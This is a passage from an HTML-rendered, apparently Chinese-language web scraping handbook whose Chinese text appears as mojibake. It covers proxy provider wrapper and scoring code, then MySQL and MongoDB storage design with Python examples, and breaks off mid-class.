        <span class="bp">self</span><span class="o">.</span><span class="n">port</span> <span class="o">=</span> <span class="n">port</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">get_proxy</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">country</span><span class="o">=</span><span class="s1">&#39;us&#39;</span><span class="p">,</span> <span class="n">session_id</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è·å–ä»£ç†&quot;&quot;&quot;</span>
        <span class="k">if</span> <span class="n">session_id</span><span class="p">:</span>
            <span class="n">username</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">username</span><span class="si">}</span><span class="s1">-country-</span><span class="si">{</span><span class="n">country</span><span class="si">}</span><span class="s1">-session-</span><span class="si">{</span><span class="n">session_id</span><span class="si">}</span><span class="s1">&#39;</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">username</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">username</span><span class="si">}</span><span class="s1">-country-</span><span class="si">{</span><span class="n">country</span><span class="si">}</span><span class="s1">&#39;</span>

        <span class="n">proxy</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;http://</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s1">:</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">password</span><span class="si">}</span><span class="s1">@</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">host</span><span class="si">}</span><span class="s1">:</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">port</span><span class="si">}</span><span class="s1">&#39;</span>
        <span class="k">return</span> <span class="p">{</span><span class="s1">&#39;http&#39;</span><span class="p">:</span> <span class="n">proxy</span><span class="p">,</span> <span class="s1">&#39;https&#39;</span><span class="p">:</span> <span class="n">proxy</span><span class="p">}</span>

<span class="c1"># ä½¿ç”¨</span>
<span class="n">proxy_provider</span> <span class="o">=</span> <span class="n">LuminatiProxy</span><span class="p">(</span><span class="s1">&#39;your_username&#39;</span><span class="p">,</span> <span class="s1">&#39;your_password&#39;</span><span class="p">)</span>
<span class="n">proxies</span> <span class="o">=</span> <span class="n">proxy_provider</span><span class="o">.</span><span class="n">get_proxy</span><span class="p">(</span><span class="n">country</span><span class="o">=</span><span class="s1">&#39;us&#39;</span><span class="p">,</span> <span class="n">session_id</span><span class="o">=</span><span class="s1">&#39;12345&#39;</span><span class="p">)</span>
<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">)</span>
</code></pre>
      </div>

      <hr />

      <h2 id="ç›‘æ§ä¸ç»Ÿè®¡">ç›‘æ§ä¸ç»Ÿè®¡</h2>

      <h3 id="ä»£ç†è´¨é‡è¯„åˆ†">ä»£ç†è´¨é‡è¯„åˆ†</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="k">class</span><span class="w"> </span><span class="nc">ProxyScorer</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">r</span> <span class="o">=</span> <span class="n">redis</span><span class="o">.</span><span class="n">Redis</span><span class="p">(</span><span class="n">decode_responses</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">record_success</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">proxy</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è®°å½•æˆåŠŸ&quot;&quot;&quot;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">r</span><span class="o">.</span><span class="n">hincrby</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;proxy:</span><span class="si">{</span><span class="n">proxy</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;success&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">update_score</span><span class="p">(</span><span class="n">proxy</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">record_failure</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">proxy</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è®°å½•å¤±è´¥&quot;&quot;&quot;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">r</span><span class="o">.</span><span class="n">hincrby</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;proxy:</span><span class="si">{</span><span class="n">proxy</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;failure&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">update_score</span><span class="p">(</span><span class="n">proxy</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">update_score</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">proxy</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æ›´æ–°è¯„åˆ†&quot;&quot;&quot;</span>
        <span class="n">success</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">r</span><span class="o">.</span><span class="n">hget</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;proxy:</span><span class="si">{</span><span class="n">proxy</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;success&#39;</span><span class="p">)</span> <span class="ow">or</span> <span class="mi">0</span><span class="p">)</span>
        <span class="n">failure</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">r</span><span class="o">.</span><span class="n">hget</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;proxy:</span><span class="si">{</span><span class="n">proxy</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;failure&#39;</span><span class="p">)</span> <span class="ow">or</span> <span class="mi">0</span><span class="p">)</span>

        <span class="n">total</span> <span class="o">=</span> <span class="n">success</span> <span class="o">+</span> <span class="n">failure</span>
        <span class="k">if</span> <span class="n">total</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
            <span class="n">score</span> <span class="o">=</span> <span class="n">success</span> <span class="o">/</span> <span class="n">total</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">r</span><span class="o">.</span><span class="n">hset</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;proxy:</span><span class="si">{</span><span class="n">proxy</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;score&#39;</span><span class="p">,</span> <span class="n">score</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">get_best_proxies</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">count</span><span class="o">=</span><span class="mi">10</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è·å–è¯„åˆ†æœ€é«˜çš„ä»£ç†&quot;&quot;&quot;</span>
        <span class="n">all_proxies</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">r</span><span class="o">.</span><span class="n">keys</span><span class="p">(</span><span class="s1">&#39;proxy:*&#39;</span><span class="p">)</span>
        <span class="n">scored_proxies</span> <span class="o">=</span> <span class="p">[]</span>

        <span class="k">for</span> <span class="n">key</span> <span class="ow">in</span> <span class="n">all_proxies</span><span class="p">:</span>
            <span class="n">proxy</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;proxy:&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
            <span class="n">score</span> <span class="o">=</span> <span class="nb">float</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">r</span><span class="o">.</span><span class="n">hget</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="s1">&#39;score&#39;</span><span class="p">)</span> <span class="ow">or</span> <span class="mi">0</span><span class="p">)</span>
            <span class="n">scored_proxies</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">proxy</span><span class="p">,</span> <span class="n">score</span><span class="p">))</span>

        <span class="n">scored_proxies</span><span class="o">.</span><span class="n">sort</span><span class="p">(</span><span class="n">key</span><span class="o">=</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">x</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">reverse</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">scored_proxies</span><span class="p">[:</span><span class="n">count</span><span class="p">]</span>
</code></pre>
      </div>

      <hr />

      <h2 id="æœ€ä½³å®è·µ">æœ€ä½³å®è·µ</h2>

      <ol>
        <li><strong>å®šæœŸéªŒè¯</strong>: æ¯5-10åˆ†é’ŸéªŒè¯ä¸€æ¬¡ä»£ç†æ± </li>
        <li><strong>å¿«é€Ÿå¤±è´¥</strong>: è®¾ç½®åˆç†çš„è¶…æ—¶æ—¶é—´ï¼ˆ3-5ç§’ï¼‰</li>
        <li><strong>è¯„åˆ†ç³»ç»Ÿ</strong>: æ ¹æ®æˆåŠŸç‡åŠ¨æ€è°ƒæ•´ä»£ç†æƒé‡</li>
        <li><strong>æ··åˆä½¿ç”¨</strong>: å…è´¹ä»£ç† + ä»˜è´¹ä»£ç†ç»„åˆ</li>
        <li><strong>åœ°åŸŸåˆ†é…</strong>: æ ¹æ®ç›®æ ‡ç½‘ç«™é€‰æ‹©å¯¹åº”åœ°åŒºä»£ç†</li>
      </ol>

      <hr />

      <h2 id="ç›¸å…³ç« èŠ‚">ç›¸å…³ç« èŠ‚</h2>

      <ul>
        <li><a href="#06-Engineering-distributed-scraping">åˆ†å¸ƒå¼çˆ¬è™«æ¶æ„</a></li>
        <li><a href="#04-Advanced-Recipes-anti-scraping-deep-dive">åçˆ¬è™«æŠ€æœ¯æ·±åº¦åˆ†æ</a></li>
        <li><a href="#06-Engineering-monitoring-and-alerting">ç›‘æ§ä¸å‘Šè­¦ç³»ç»Ÿ</a></li>
      </ul>

    </div>

    <div class="section" id="06-Engineering-data-storage-solutions">
      <h2>53. Data Storage Solutions</h2>
      <h1 id="æ•°æ®å­˜å‚¨æ–¹æ¡ˆ">æ•°æ®å­˜å‚¨æ–¹æ¡ˆ</h1>

      <h2 id="æ¦‚è¿°">æ¦‚è¿°</h2>

      <p>çˆ¬è™«ç³»ç»Ÿéœ€è¦é«˜æ•ˆçš„æ•°æ®å­˜å‚¨æ–¹æ¡ˆæ¥å¤„ç†æµ·é‡æ•°æ®ã€‚æœ¬ç« ä»‹ç»å¸¸è§çš„å­˜å‚¨é€‰å‹å’Œæœ€ä½³å®è·µã€‚</p>

      <hr />

      <h2 id="å­˜å‚¨é€‰å‹">å­˜å‚¨é€‰å‹</h2>

      <h3 id="å…³ç³»å‹æ•°æ®åº“-vs-nosql">å…³ç³»å‹æ•°æ®åº“ vs NoSQL</h3>

      <table>
        <thead>
          <tr>
            <th>ç‰¹æ€§</th>
            <th>å…³ç³»å‹æ•°æ®åº“</th>
            <th>NoSQL</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>æ•°æ®æ¨¡å‹</strong></td>
            <td>è¡¨æ ¼ã€ä¸¥æ ¼schema</td>
            <td>æ–‡æ¡£ã€é”®å€¼ã€åˆ—æ—</td>
          </tr>
          <tr>
            <td><strong>æ‰©å±•æ€§</strong></td>
            <td>å‚ç›´æ‰©å±•</td>
            <td>æ°´å¹³æ‰©å±•</td>
          </tr>
          <tr>
            <td><strong>äº‹åŠ¡æ”¯æŒ</strong></td>
            <td>ACID å®Œæ•´æ”¯æŒ</td>
            <td>éƒ¨åˆ†æ”¯æŒ</td>
          </tr>
          <tr>
            <td><strong>æŸ¥è¯¢èƒ½åŠ›</strong></td>
            <td>å¼ºå¤§çš„ SQL</td>
            <td>å—é™çš„æŸ¥è¯¢è¯­è¨€</td>
          </tr>
          <tr>
            <td><strong>é€‚ç”¨åœºæ™¯</strong></td>
            <td>ç»“æ„åŒ–æ•°æ®ã€å¤æ‚å…³è”</td>
            <td>æµ·é‡æ•°æ®ã€é«˜å¹¶å‘å†™å…¥</td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h2 id="mysql">MySQL</h2>

      <h3 id="é€‚ç”¨åœºæ™¯">é€‚ç”¨åœºæ™¯</h3>

      <ul>
        <li>ç»“æ„åŒ–æ•°æ®å­˜å‚¨</li>
        <li>éœ€è¦å¤æ‚å…³è”æŸ¥è¯¢</li>
        <li>äº‹åŠ¡è¦æ±‚é«˜</li>
        <li>æ•°æ®é‡åœ¨åƒä¸‡çº§ä»¥ä¸‹</li>
      </ul>

      <h3 id="è¡¨è®¾è®¡ç¤ºä¾‹">è¡¨è®¾è®¡ç¤ºä¾‹</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">-- ç”¨æˆ·è¡¨</span>
<span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="p">(</span>
<span class="w">    </span><span class="n">id</span><span class="w"> </span><span class="nb">INT</span><span class="w"> </span><span class="k">PRIMARY</span><span class="w"> </span><span class="k">KEY</span><span class="w"> </span><span class="n">AUTO_INCREMENT</span><span class="p">,</span>
<span class="w">    </span><span class="n">username</span><span class="w"> </span><span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">50</span><span class="p">)</span><span class="w"> </span><span class="k">UNIQUE</span><span class="w"> </span><span class="k">NOT</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span>
<span class="w">    </span><span class="n">email</span><span class="w"> </span><span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">100</span><span class="p">),</span>
<span class="w">    </span><span class="n">created_at</span><span class="w"> </span><span class="k">TIMESTAMP</span><span class="w"> </span><span class="k">DEFAULT</span><span class="w"> </span><span class="k">CURRENT_TIMESTAMP</span><span class="p">,</span>
<span class="w">    </span><span class="k">INDEX</span><span class="w"> </span><span class="n">idx_username</span><span class="w"> </span><span class="p">(</span><span class="n">username</span><span class="p">),</span>
<span class="w">    </span><span class="k">INDEX</span><span class="w"> </span><span class="n">idx_created_at</span><span class="w"> </span><span class="p">(</span><span class="n">created_at</span><span class="p">)</span>
<span class="p">)</span><span class="w"> </span><span class="n">ENGINE</span><span class="o">=</span><span class="n">InnoDB</span><span class="w"> </span><span class="k">DEFAULT</span><span class="w"> </span><span class="n">CHARSET</span><span class="o">=</span><span class="n">utf8mb4</span><span class="p">;</span>

<span class="c1">-- æ–‡ç« è¡¨</span>
<span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">articles</span><span class="w"> </span><span class="p">(</span>
<span class="w">    </span><span class="n">id</span><span class="w"> </span><span class="nb">INT</span><span class="w"> </span><span class="k">PRIMARY</span><span class="w"> </span><span class="k">KEY</span><span class="w"> </span><span class="n">AUTO_INCREMENT</span><span class="p">,</span>
<span class="w">    </span><span class="n">user_id</span><span class="w"> </span><span class="nb">INT</span><span class="w"> </span><span class="k">NOT</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span>
<span class="w">    </span><span class="n">title</span><span class="w"> </span><span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span><span class="w"> </span><span class="k">NOT</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span>
<span class="w">    </span><span class="n">content</span><span class="w"> </span><span class="nb">TEXT</span><span class="p">,</span>
<span class="w">    </span><span class="n">view_count</span><span class="w"> </span><span class="nb">INT</span><span class="w"> </span><span class="k">DEFAULT</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span>
<span class="w">    </span><span class="n">created_at</span><span class="w"> </span><span class="k">TIMESTAMP</span><span class="w"> </span><span class="k">DEFAULT</span><span class="w"> </span><span class="k">CURRENT_TIMESTAMP</span><span class="p">,</span>
<span class="w">    </span><span class="k">FOREIGN</span><span class="w"> </span><span class="k">KEY</span><span class="w"> </span><span class="p">(</span><span class="n">user_id</span><span class="p">)</span><span class="w"> </span><span class="k">REFERENCES</span><span class="w"> </span><span class="n">users</span><span class="p">(</span><span class="n">id</span><span class="p">),</span>
<span class="w">    </span><span class="k">INDEX</span><span class="w"> </span><span class="n">idx_user_id</span><span class="w"> </span><span class="p">(</span><span class="n">user_id</span><span class="p">),</span>
<span class="w">    </span><span class="k">INDEX</span><span class="w"> </span><span class="n">idx_created_at</span><span class="w"> </span><span class="p">(</span><span class="n">created_at</span><span class="p">),</span>
<span class="w">    </span><span class="n">FULLTEXT</span><span class="w"> </span><span class="k">INDEX</span><span class="w"> </span><span class="n">idx_content</span><span class="w"> </span><span class="p">(</span><span class="n">title</span><span class="p">,</span><span class="w"> </span><span class="n">content</span><span class="p">)</span>
<span class="p">)</span><span class="w"> </span><span class="n">ENGINE</span><span class="o">=</span><span class="n">InnoDB</span><span class="w"> </span><span class="k">DEFAULT</span><span class="w"> </span><span class="n">CHARSET</span><span class="o">=</span><span class="n">utf8mb4</span><span class="p">;</span>
</code></pre>
      </div>

      <h3 id="python-æ“ä½œç¤ºä¾‹">Python æ“ä½œç¤ºä¾‹</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">pymysql</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">dbutils.pooled_db</span><span class="w"> </span><span class="kn">import</span> <span class="n">PooledDB</span>

<span class="k">class</span><span class="w"> </span><span class="nc">MySQLStorage</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">host</span><span class="o">=</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">3306</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="s1">&#39;root&#39;</span><span class="p">,</span>
                 <span class="n">password</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="n">database</span><span class="o">=</span><span class="s1">&#39;scraper&#39;</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">pool</span> <span class="o">=</span> <span class="n">PooledDB</span><span class="p">(</span>
            <span class="n">creator</span><span class="o">=</span><span class="n">pymysql</span><span class="p">,</span>
            <span class="n">maxconnections</span><span class="o">=</span><span class="mi">20</span><span class="p">,</span>
            <span class="n">mincached</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span>
            <span class="n">maxcached</span><span class="o">=</span><span class="mi">5</span><span class="p">,</span>
            <span class="n">host</span><span class="o">=</span><span class="n">host</span><span class="p">,</span>
            <span class="n">port</span><span class="o">=</span><span class="n">port</span><span class="p">,</span>
            <span class="n">user</span><span class="o">=</span><span class="n">user</span><span class="p">,</span>
            <span class="n">password</span><span class="o">=</span><span class="n">password</span><span class="p">,</span>
            <span class="n">database</span><span class="o">=</span><span class="n">database</span><span class="p">,</span>
            <span class="n">charset</span><span class="o">=</span><span class="s1">&#39;utf8mb4&#39;</span><span class="p">,</span>
            <span class="n">cursorclass</span><span class="o">=</span><span class="n">pymysql</span><span class="o">.</span><span class="n">cursors</span><span class="o">.</span><span class="n">DictCursor</span>
        <span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">insert_article</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">article</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æ’å…¥æ–‡ç« &quot;&quot;&quot;</span>
        <span class="n">conn</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">pool</span><span class="o">.</span><span class="n">connection</span><span class="p">()</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="k">with</span> <span class="n">conn</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span> <span class="k">as</span> <span class="n">cursor</span><span class="p">:</span>
                <span class="n">sql</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;</span>
<span class="s2">                INSERT INTO articles (user_id, title, content, view_count)</span>
<span class="s2">                VALUES (</span><span class="si">%(user_id)s</span><span class="s2">, </span><span class="si">%(title)s</span><span class="s2">, </span><span class="si">%(content)s</span><span class="s2">, </span><span class="si">%(view_count)s</span><span class="s2">)</span>
<span class="s2">                &quot;&quot;&quot;</span>
                <span class="n">cursor</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">sql</span><span class="p">,</span> <span class="n">article</span><span class="p">)</span>
                <span class="n">conn</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
                <span class="k">return</span> <span class="n">cursor</span><span class="o">.</span><span class="n">lastrowid</span>
        <span class="k">finally</span><span class="p">:</span>
            <span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">batch_insert</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">articles</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æ‰¹é‡æ’å…¥&quot;&quot;&quot;</span>
        <span class="n">conn</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">pool</span><span class="o">.</span><span class="n">connection</span><span class="p">()</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="k">with</span> <span class="n">conn</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span> <span class="k">as</span> <span class="n">cursor</span><span class="p">:</span>
                <span class="n">sql</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;</span>
<span class="s2">                INSERT INTO articles (user_id, title, content)</span>
<span class="s2">                VALUES (</span><span class="si">%(user_id)s</span><span class="s2">, </span><span class="si">%(title)s</span><span class="s2">, </span><span class="si">%(content)s</span><span class="s2">)</span>
<span class="s2">                &quot;&quot;&quot;</span>
                <span class="n">cursor</span><span class="o">.</span><span class="n">executemany</span><span class="p">(</span><span class="n">sql</span><span class="p">,</span> <span class="n">articles</span><span class="p">)</span>
                <span class="n">conn</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
        <span class="k">finally</span><span class="p">:</span>
            <span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">query_by_user</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">user_id</span><span class="p">,</span> <span class="n">limit</span><span class="o">=</span><span class="mi">10</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æŸ¥è¯¢ç”¨æˆ·æ–‡ç« &quot;&quot;&quot;</span>
        <span class="n">conn</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">pool</span><span class="o">.</span><span class="n">connection</span><span class="p">()</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="k">with</span> <span class="n">conn</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span> <span class="k">as</span> <span class="n">cursor</span><span class="p">:</span>
                <span class="n">sql</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;</span>
<span class="s2">                SELECT * FROM articles</span>
<span class="s2">                WHERE user_id = </span><span class="si">%s</span>
<span class="s2">                ORDER BY created_at DESC</span>
<span class="s2">                LIMIT </span><span class="si">%s</span>
<span class="s2">                &quot;&quot;&quot;</span>
                <span class="n">cursor</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">sql</span><span class="p">,</span> <span class="p">(</span><span class="n">user_id</span><span class="p">,</span> <span class="n">limit</span><span class="p">))</span>
                <span class="k">return</span> <span class="n">cursor</span><span class="o">.</span><span class="n">fetchall</span><span class="p">()</span>
        <span class="k">finally</span><span class="p">:</span>
            <span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</code></pre>
      </div>

      <hr />

      <h2 id="mongodb">MongoDB</h2>

      <h3 id="é€‚ç”¨åœºæ™¯-2">é€‚ç”¨åœºæ™¯</h3>

      <ul>
        <li>åŠç»“æ„åŒ–æ•°æ®</li>
        <li>Schema ç»å¸¸å˜åŠ¨</li>
        <li>éœ€è¦æ°´å¹³æ‰©å±•</li>
        <li>è¯»å†™æ€§èƒ½è¦æ±‚é«˜</li>
      </ul>

      <h3 id="æ–‡æ¡£è®¾è®¡ç¤ºä¾‹">æ–‡æ¡£è®¾è®¡ç¤ºä¾‹</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// ç”¨æˆ·æ–‡æ¡£</span>
<span class="p">{</span>
<span class="w">  </span><span class="s2">&quot;_id&quot;</span><span class="o">:</span><span class="w"> </span><span class="nx">ObjectId</span><span class="p">(</span><span class="s2">&quot;507f1f77bcf86cd799439011&quot;</span><span class="p">),</span>
<span class="w">  </span><span class="s2">&quot;username&quot;</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;john_doe&quot;</span><span class="p">,</span>
<span class="w">  </span><span class="s2">&quot;email&quot;</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;john@example.com&quot;</span><span class="p">,</span>
<span class="w">  </span><span class="s2">&quot;profile&quot;</span><span class="o">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="s2">&quot;age&quot;</span><span class="o">:</span><span class="w"> </span><span class="mf">30</span><span class="p">,</span>
<span class="w">    </span><span class="s2">&quot;location&quot;</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;Beijing&quot;</span>
<span class="w">  </span><span class="p">},</span>
<span class="w">  </span><span class="s2">&quot;tags&quot;</span><span class="o">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;tech&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;science&quot;</span><span class="p">],</span>
<span class="w">  </span><span class="s2">&quot;created_at&quot;</span><span class="o">:</span><span class="w"> </span><span class="nx">ISODate</span><span class="p">(</span><span class="s2">&quot;2024-01-01T00:00:00Z&quot;</span><span class="p">)</span>
<span class="p">}</span>

<span class="c1">// æ–‡ç« æ–‡æ¡£</span>
<span class="p">{</span>
<span class="w">  </span><span class="s2">&quot;_id&quot;</span><span class="o">:</span><span class="w"> </span><span class="nx">ObjectId</span><span class="p">(</span><span class="s2">&quot;507f191e810c19729de860ea&quot;</span><span class="p">),</span>
<span class="w">  </span><span class="s2">&quot;user_id&quot;</span><span class="o">:</span><span class="w"> </span><span class="nx">ObjectId</span><span class="p">(</span><span class="s2">&quot;507f1f77bcf86cd799439011&quot;</span><span class="p">),</span>
<span class="w">  </span><span class="s2">&quot;title&quot;</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;Web é€†å‘å…¥é—¨&quot;</span><span class="p">,</span>
<span class="w">  </span><span class="s2">&quot;content&quot;</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;...&quot;</span><span class="p">,</span>
<span class="w">  </span><span class="s2">&quot;tags&quot;</span><span class="o">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;é€†å‘&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;çˆ¬è™«&quot;</span><span class="p">],</span>
<span class="w">  </span><span class="s2">&quot;stats&quot;</span><span class="o">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="s2">&quot;views&quot;</span><span class="o">:</span><span class="w"> </span><span class="mf">1000</span><span class="p">,</span>
<span class="w">    </span><span class="s2">&quot;likes&quot;</span><span class="o">:</span><span class="w"> </span><span class="mf">50</span>
<span class="w">  </span><span class="p">},</span>
<span class="w">  </span><span class="s2">&quot;comments&quot;</span><span class="o">:</span><span class="w"> </span><span class="p">[</span>
<span class="w">    </span><span class="p">{</span>
<span class="w">      </span><span class="s2">&quot;user&quot;</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;alice&quot;</span><span class="p">,</span>
<span class="w">      </span><span class="s2">&quot;text&quot;</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;Great article!&quot;</span><span class="p">,</span>
<span class="w">      </span><span class="s2">&quot;date&quot;</span><span class="o">:</span><span class="w"> </span><span class="nx">ISODate</span><span class="p">(</span><span class="s2">&quot;2024-01-02T00:00:00Z&quot;</span><span class="p">)</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">  </span><span class="p">],</span>
<span class="w">  </span><span class="s2">&quot;created_at&quot;</span><span class="o">:</span><span class="w"> </span><span class="nx">ISODate</span><span class="p">(</span><span class="s2">&quot;2024-01-01T00:00:00Z&quot;</span><span class="p">)</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h3 id="python-æ“ä½œç¤ºä¾‹-2">Python æ“ä½œç¤ºä¾‹</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">pymongo</span><span class="w"> </span><span class="kn">import</span> <span class="n">MongoClient</span><span class="p">,</span> <span class="n">ASCENDING</span><span class="p">,</span> <span class="n">DESCENDING</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">datetime</span><span class="w"> </span><span class="kn">import</span> <span class="n">datetime</span>

<span class="k">class</span><span class="w"> </span><span class="nc">MongoStorage</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">uri</span><span class="o">=</span><span class="s1">&#39;mongodb://localhost:27017/&#39;</span><span class="p">,</span> <span class="n">db_name</span><span class="o">=</span><span class="s1">&#39;scraper&#39;</span><span class="p">):</span>
